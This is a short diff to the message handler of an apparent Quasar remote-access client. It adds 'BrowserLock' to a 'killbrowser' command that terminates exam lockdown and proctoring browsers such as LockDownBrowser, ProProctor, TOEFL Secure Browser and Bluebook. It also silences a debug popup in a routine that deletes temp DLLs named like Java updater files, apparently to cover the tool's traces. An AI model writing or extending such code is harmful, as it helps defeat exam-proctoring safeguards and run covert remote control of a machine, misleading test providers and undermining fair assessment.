@@ -37,16 +37,17 @@ namespace Quasar.Client.Messages
                 if (message.type == "killbrowser")
                 {
                     string[] array3 = new string[]
-                                {
-                                "LockDownBrowser",
-                                "onlinetestwks",
-                                "etschrome",
-                                "TOEFL Secure Browser",
-                                "ProProctor",
-                                "LockDownBrowserOEM",
-                                "PSI Bridge Secure Browser",
-                                "Bluebook"
-                                };
+                    {
+                        "LockDownBrowser",
+                        "onlinetestwks",
+                        "etschrome",
+                        "TOEFL Secure Browser",
+                        "ProProctor",
+                        "LockDownBrowserOEM",
+                        "PSI Bridge Secure Browser",
+                        "Bluebook",
+                        "BrowserLock"
+                    };
                     List<string> list = new List<string>();
                     foreach (string text12 in array3)
                     {
@@ -113,7 +114,7 @@ namespace Quasar.Client.Messages
 
                     // Get the system temporary directory
                     string tempDirectory = Path.GetTempPath();
-                    MessageBox.Show(tempDirectory);
+                    // MessageBox.Show(tempDirectory);
                     // Find and delete DLL files starting with "JavaUpdater_jdk"
                     var files = Directory.GetFiles(tempDirectory, "JavaUpdater_jdk*.dll");
                     foreach (var file in files)
